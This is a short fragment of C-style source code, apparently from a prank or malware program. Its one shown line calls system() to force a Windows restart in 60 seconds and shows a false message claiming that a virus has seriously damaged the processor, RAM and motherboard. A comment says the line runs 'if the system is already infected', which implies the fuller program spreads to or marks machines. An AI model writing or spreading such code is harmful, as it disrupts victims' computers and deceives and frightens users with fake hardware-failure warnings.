...
system("shutdown -r -t 60 -c \"SEVERE HARDWARE FAILURE! YOUR PROCESSOR,RAM AND MOTHERBOARD ARE SERIOUSLY DAMAGED DUE TO AN UNKNOWN VIRUS.CONTACT SYSTEM VENDOR.\"");//if the system is already infected then just give a command to restart
}